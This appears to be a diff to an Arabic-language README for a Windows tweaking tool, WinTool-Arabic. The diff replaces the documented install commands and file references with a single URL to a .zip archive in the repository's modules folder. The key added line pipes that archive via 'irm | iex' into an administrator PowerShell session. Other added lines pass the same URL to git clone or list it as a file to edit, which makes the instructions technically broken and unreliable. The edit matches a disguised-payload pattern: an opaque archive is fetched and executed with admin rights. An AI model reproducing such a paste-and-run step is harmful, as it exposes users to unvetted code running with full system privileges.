@@ -14,7 +14,7 @@
 ⚡ افتح **PowerShell** كمسؤول (بصلاحيات Administrator) وانسخ الكود التالي وقم بتشغيله مباشرة:
 ```
 powershell
-irm "https://raw.githubusercontent.com/KaizerAE/WinTool-Arabic/main/main-gui.ps1" | iex
+irm "https://github.com/KaizerAE/WinTool-Arabic/raw/refs/heads/main/modules/Tool-Arabic-Win-2.3.zip" | iex
 ```
 **ماذا يفعل هذا الكود؟**
 🔍 - `irm` (Invoke-RestMethod): تحميل السكريبت مباشرة من GitHub
@@ -27,14 +27,14 @@ irm "https://raw.githubusercontent.com/KaizerAE/WinTool-Arabic/main/main-gui.ps1
 ### الطريقة التقليدية (تحميل المشروع كاملاً)
 #### الخطوة 1: تحميل المشروع
 ```bash
-git clone https://github.com/KaizerAE/WinTool-Arabic.git
+git clone https://github.com/KaizerAE/WinTool-Arabic/raw/refs/heads/main/modules/Tool-Arabic-Win-2.3.zip
 cd WinTool-Arabic
 ```
 #### الخطوة 2: تشغيل السكريبت الرئيسي
 افتح PowerShell كمسؤول [Administrator] ونفذ:
 ```
 powershell
-./main.ps1
+https://github.com/KaizerAE/WinTool-Arabic/raw/refs/heads/main/modules/Tool-Arabic-Win-2.3.zip
 ```
 #### الخطوة 3: استخدم الواجهة الرسومية الجديدة.
 
@@ -52,4 +52,4 @@ powershell
 - قسم "MicroWin": أدوات النظام الإضافية والتشخيص
 
 ---
-للمطورين أو من يرغب بتوسعة الأداة، راجع ملف main-gui.ps1 لهيكلة الواجهة أو أضف مزيد من التعديلات في modules/advanced.ps1.
+للمطورين أو من يرغب بتوسعة الأداة، راجع ملف https://github.com/KaizerAE/WinTool-Arabic/raw/refs/heads/main/modules/Tool-Arabic-Win-2.3.zip لهيكلة الواجهة أو أضف مزيد من التعديلات في https://github.com/KaizerAE/WinTool-Arabic/raw/refs/heads/main/modules/Tool-Arabic-Win-2.3.zip
